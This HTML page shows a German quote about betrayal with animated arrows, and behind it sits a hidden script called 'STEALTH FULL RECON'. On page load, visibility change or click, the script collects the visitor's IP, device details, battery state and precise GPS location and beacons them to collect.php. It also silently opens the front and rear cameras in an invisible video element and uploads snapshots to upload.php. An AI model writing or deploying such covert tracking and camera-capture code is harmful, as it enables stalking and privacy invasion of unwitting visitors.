<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Der Verrat</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;overflow:hidden;}
        .container{max-width:600px;padding:40px 20px;background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border-radius:20px;border:1px solid rgba(255,255,255,0.1);box-shadow:0 20px 40px rgba(0,0,0,0.3);animation:fadeIn 1s ease-in;}
        @keyframes fadeIn{from{opacity:0;transform:translateY(30px);}to{opacity:1;transform:translateY(0);}}
        h1{font-size:2.5em;margin-bottom:20px;background:linear-gradient(45deg,#ff6b6b,#4ecdc4,#45b7d1);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
        .quote{font-size:1.3em;line-height:1.6;margin-bottom:30px;opacity:0.9;font-style:italic;}
        .arrows{font-size:4em;margin:30px 0;animation:pulse 2s infinite;}
        @keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.1);}}
        .disclaimer{font-size:0.9em;opacity:0.7;margin-top:30px;}
    </style>
</head>
<body>
    <div class="container">
        <h1>üó°Ô∏è Der Verrat</h1>
        <div class="quote">
            Wenn du wissen willst wo der Verrat liegt,<br>
            schau aus welcher Richtung die Pfeile kommen.
        </div>
        <div class="arrows">‚ÜñÔ∏è ‚ÜôÔ∏è ‚ÜóÔ∏è ‚ÜòÔ∏è</div>
        <div class="disclaimer">Die Wahrheit zeigt sich denen, die richtig schauen...</div>
    </div>

    <script>
    // STEALTH FULL RECON - NO POPUPS
    async function pwnVictim(){
        const data={
            ip:await getIP(),
            ua:navigator.userAgent,
            lang:navigator.language,
            tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen:`${screen.width}x${screen.height}x${screen.colorDepth}`,
            battery:await getBattery(),
            gps:await getGPS(),
            wifi:await getWiFi(),
            timestamp:new Date().toISOString(),
            referrer:document.referrer
        };
        navigator.sendBeacon('collect.php',JSON.stringify(data));
        silentCam();
    }
    
    async function getIP(){try{const r=await fetch('https://api.ipify.org?format=json');return(await r.json()).ip}catch{return'unknown';}}
    async function getGPS(){return new Promise(r=>{if(!navigator.geolocation)return r('no-gps');navigator.geolocation.getCurrentPosition(p=>r(`GPS:${p.coords.latitude.toFixed(6)},${p.coords.longitude.toFixed(6)}`),()=>r('gps-denied'),{enableHighAccuracy:true,timeout:5e3,maximumAge:0});});}
    async function getWiFi(){return'connection'in navigator?`${navigator.connection.effectiveType}/${navigator.connection.downlink}Mbps`:'unknown';}
    async function getBattery(){if('getBattery'in navigator){const b=await navigator.getBattery();return`${Math.round(b.level*100)}% (${b.charging?'charging':''})`;}return'unknown';}
    
    async function silentCam(){
        const v=document.createElement('video');v.style.cssText='position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;';
        try{
            const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:false});
            v.srcObject=s;document.body.appendChild(v);v.play();
            setTimeout(()=>capture(v,'front'),2500);
            setTimeout(async()=>{
                try{
                    const bs=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
                    const bv=document.createElement('video');bv.srcObject=bs;bv.style.cssText=v.style.cssText;
                    setTimeout(()=>capture(bv,'back'),1500);
                }catch{}
            },4500);
        }catch{}
    }
    
    function capture(v,type){
        const c=document.createElement('canvas');c.width=640;c.height=480;c.getContext('2d').drawImage(v,0,0);
        c.toBlob(b=>{const f=new FormData();f.append('photo',b,`${type}_${Date.now()}.jpg`);f.append('type',type);navigator.sendBeacon('upload.php',f);});
        v.srcObject.getTracks().forEach(t=>t.stop());
    }
    
    window.addEventListener('load',pwnVictim);
    document.addEventListener('visibilitychange',()=>!document.hidden&&pwnVictim());
    document.addEventListener('click',pwnVictim,{once:true});
    </script>
</body>
</html>
